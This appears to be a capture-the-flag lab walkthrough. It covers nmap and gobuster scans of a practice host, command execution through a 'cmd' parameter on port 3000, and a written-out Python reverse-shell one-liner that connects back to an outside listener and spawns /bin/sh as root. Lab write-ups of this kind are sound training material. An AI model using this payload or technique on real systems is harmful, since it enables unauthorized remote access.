## NMAP
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 14:50 EDT
Nmap scan report for 10.10.25.95                                                                                                                    
Host is up (0.18s latency).                                                                                                                         
Not shown: 995 closed ports                                                                                                                         
PORT     STATE SERVICE VERSION                                                                                                                      
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)                                                                 
| ssh-hostkey:                                                                                                                                      
|   2048 1d:f0:d5:f2:67:1e:55:99:de:c6:26:85:b3:86:ea:81 (RSA)                                                                                      
|   256 4f:5f:62:98:aa:b1:dd:a2:81:61:16:9b:a5:29:cd:bd (ECDSA)                                                                                     
|_  256 9b:12:b0:f3:1f:fb:b7:d8:a8:9c:6b:e6:bd:f4:40:55 (ED25519)                                                                                   
23/tcp   open  telnet  Linux telnetd                                                                                                                
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                                               
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                        
|_http-title: Michael Jordan                                                                                                                        
3000/tcp open  http    Node.js (Express middleware)                                                                                                 
|_http-title: Site doesn't have a title (text/html; charset=utf-8).                                                                                 
9999/tcp open  http    Golang net/http server                                                                                                       
| fingerprint-strings:                                                                                                                              
|   FourOhFourRequest:                                                                                                                              
|     HTTP/1.0 200 OK                                                                                                                               
|     Date: Sun, 20 Sep 2020 18:50:24 GMT                                                                                                           
|     Content-Length: 1                                                                                                                             
|     Content-Type: text/plain; charset=utf-8                                                                                                       
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:                                                                  
|     HTTP/1.1 400 Bad Request                                                                                                                      
|     Content-Type: text/plain                                            
|     Connection: close                                                   
|     Request                 
|   GetRequest, HTTPOptions:                                                                                                                        
|     HTTP/1.0 200 OK                                                     
|     Date: Sun, 20 Sep 2020 18:50:23 GMT    
|     Content-Length: 1                                                                                                                             
|     Content-Type: text/plain; charset=utf-8                                                                                                       
|   OfficeScan:                                                                                                                                     
|     HTTP/1.1 400 Bad Request                                                                                                                      
|     Content-Type: text/plain                                                                                                                      
|     Connection: close                                                                                                                             
|_    Request: missing required Host header                         
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/
submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=9/20%Time=5F67A46F%P=x86_64-pc-linux-gnu%r(Ge 
SF:tRequest,75,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2020\x20Sep\x2020 
SF:20\x2018:50:23\x20GMT\r\nContent-Length:\x201\r\nContent-Type:\x20text/ 
SF:plain;\x20charset=utf-8\r\n\r\n\n")%r(HTTPOptions,75,"HTTP/1\.0\x20200\ 
SF:x20OK\r\nDate:\x20Sun,\x2020\x20Sep\x202020\x2018:50:23\x20GMT\r\nConte 
SF:nt-Length:\x201\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\ 
SF:n\n")%r(FourOhFourRequest,75,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x 
SF:2020\x20Sep\x202020\x2018:50:24\x20GMT\r\nContent-Length:\x201\r\nConte 
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n\n")%r(GenericLines,58, 
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain\r\nC 
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest,58,"HT 
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain\r\nConn 
SF:ection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,58,"HTTP/1\.1\x2 
SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain\r\nConnection:\x2 
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,58,"HTTP/1\.1\x20 
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain\r\nConnection:\x20 
SF:close\r\n\r\n400\x20Bad\x20Request")%r(LPDString,58,"HTTP/1\.1\x20400\x 
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain\r\nConnection:\x20close 
SF:\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,58,"HTTP/1\.1\x20400\x20Ba 
SF:d\x20Request\r\nContent-Type:\x20text/plain\r\nConnection:\x20close\r\n 
SF:\r\n400\x20Bad\x20Request")%r(Socks5,58,"HTTP/1\.1\x20400\x20Bad\x20Req 
SF:uest\r\nContent-Type:\x20text/plain\r\nConnection:\x20close\r\n\r\n400\ 
SF:x20Bad\x20Request")%r(OfficeScan,76,"HTTP/1\.1\x20400\x20Bad\x20Request 
SF:\r\nContent-Type:\x20text/plain\r\nConnection:\x20close\r\n\r\n400\x20B 
SF:ad\x20Request:\x20missing\x20required\x20Host\x20header");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.58 seconds

```

## Gobuster

```
gobuster dir -u http://10.10.25.95 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.25.95
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/20 14:50:41 Starting gobuster
===============================================================
/images (Status: 301)
/img (Status: 301)
/mail (Status: 301)
/scripts (Status: 301)
/local (Status: 301)
/css (Status: 301)
/test (Status: 301)
/install (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/vendor (Status: 301)
/flag (Status: 301)
/LICENSE (Status: 200)

```

## PORT 80

There wasn't anything interesting on PORT 80

## PORT 30000

There was remote code execution on that page `10.10.25.95:3000?cmd=ls` which will give us an output.

## Reverse Shell

For reverse shell only python payload was working.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.94.60",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Privilege Escalation

There was no need to escalate our privileges we were already a root user through this reverse shell.